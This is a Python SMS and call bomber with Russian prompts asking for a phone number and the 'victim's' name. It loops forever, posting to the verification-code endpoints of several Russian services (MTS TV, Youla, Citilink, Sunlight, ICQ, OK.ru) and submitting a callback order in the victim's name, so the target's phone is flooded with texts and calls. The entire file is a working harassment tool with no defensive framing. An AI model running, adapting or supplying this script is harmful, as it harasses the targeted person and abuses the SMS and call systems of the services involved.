import requests, time

phone = input("Введите номер телефона (7XXXXXXXXXX) >>>")
name = input("Введите имя жертвы")
circle = 0
while 1 > 0:
  #SMS
  requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code?msisdn=' + phone, data={}, headers={'accept-language':'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7', 'origin':'https://mtstv.mts.ru','referer':'https://mtstv.mts.ru/home'})
  requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': phone}, headers={'Accept-Language':'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7', 'Connection':'keep-alive', 'Host':'youla.ru', 'Origin':'https://youla.ru','Referer':'https://youla.ru/'})
  requests.post('https://www.citilink.ru/registration/confirm/phone/+' + phone + '/', data={}, headers={'accept-language':'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7', 'origin':'https://www.citilink.ru','referer':'https://www.citilink.ru/registration/'})
  requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': phone}, headers={'Accept-Language':'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7', 'Connection':'keep-alive', 'Host':'api.sunlight.net', 'Origin':'https://sunlight.net','Referer':'https://sunlight.net/profile/login/?next=/profile/'})
  requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php", data={"msisdn": phone, "locale": "en", "countryCode": "ru", "version": "1", "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
  requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data={"st.r.phone": "+" + phone})
  #requests.post('', data={'':''}, headers={'Accept-Language':'', 'Connection':'', 'Host':'', 'Origin':'','Referer':''})
  #requests.post('', data={'':''}, headers={'Accept-Language':'', 'Connection':'', 'Host':'', 'Origin':'','Referer':''})
  #requests.post('', data={'':''}, headers={'Accept-Language':'', 'Connection':'', 'Host':'', 'Origin':'','Referer':''})
  #requests.post('', data={'':''}, headers={'Accept-Language':'', 'Connection':'', 'Host':'', 'Origin':'','Referer':''})
  #requests.post('', data={'':''}, headers={'Accept-Language':'', 'Connection':'', 'Host':'', 'Origin':'','Referer':''})
  #requests.post('', data={'':''}, headers={'Accept-Language':'', 'Connection':'', 'Host':'', 'Origin':'','Referer':''})
  #CALL
  requests.post('https://f.arterio.ru/', data={'order[phone]':'+'+phone[0]+'('+phone[1]+phone[2]+phone[3]+')'+phone[4]+phone[5]+phone[6]+'-'+phone[7]+phone[8]+'-'+phone[9]+phone[10], 'order[fio]':name}, headers={'accept-language':'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7', 'origin':'https://f.arterio.ru','referer':'https://f.arterio.ru/'})
  
  print("Круг пройден!")
  if circle == 0:
    time.sleep(30)
  if circle == 1:
    time.sleep(60)
  if circle == 2:
    time.sleep(90)
  if circle == 3:
    time.sleep(120)
  if circle == 4:
    time.sleep(150)
